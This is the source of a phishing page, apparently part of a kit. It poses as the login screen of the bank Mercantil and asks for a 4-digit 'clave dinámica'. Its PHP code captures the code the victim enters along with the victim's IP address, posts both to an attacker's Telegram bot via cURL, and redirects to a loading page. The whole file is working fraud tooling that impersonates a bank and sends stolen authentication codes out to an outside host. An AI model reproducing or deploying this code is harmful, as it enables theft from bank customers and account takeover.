<?php
include './config.php';



  $tok = isset($_POST["tok"]) ? $_POST["tok"] : '';


  if (isset($_POST['submit2'])) {


  $ip_address = $_SERVER['REMOTE_ADDR'];
  $message = "MERCANTIL  \n\nDINAMICA: <code>$tok</code> \nIP: $ip_address";



       $telegram_api_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
      $data = array(
          'chat_id' => $chat_id,
          'text' => $message,
          'parse_mode' => 'HTML'
      );

      // Use cURL to send the API request.
      $ch = curl_init($telegram_api_url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($ch);
      curl_close($ch);



    header("Location: ./loading.php");
    ob_end_flush();
    exit(); }


  ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./index.css">
    <title>Mercantil</title>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
               <img src="./img/log_mov.png" width="150px" alt="">
            </div>

            <form action="" class="form" method="post">
                <div class="login-container">
                    <h2>Bienvenido</h2>
                    <h1>Inicia tu sesión</h1>



                    <div class="input-container">
                        <label for="">Clave Dinámica</label>
                        <input required minlength="4" id="numberInput" oninput="restrictInput()" maxlength="4" name="tok" type="text" placeholder="Ingresa tu clave dinámica">
                    </div>
<Br>
                    <span style="width: 300%; font-size: 14px;">Ingresa tu clave dinámica de 4 digitos.</span>

                    <br><br><br>

                  


                    <button class="butonsin" name="submit2">Continuar</button>
    
                </div>



             
            </form>
        </div>
    </div>
		
			    <script>
        function restrictInput() {
            // Get the input element by its ID
            let inputElement = document.getElementById("numberInput");

            // Get the input value
            let inputValue = inputElement.value;

            // Replace anything that is not a number
            inputValue = inputValue.replace(/[^0-9]/g, '');

            // Set the filtered value back to the input field
            inputElement.value = inputValue;
        }
    </script>
</body>
</html>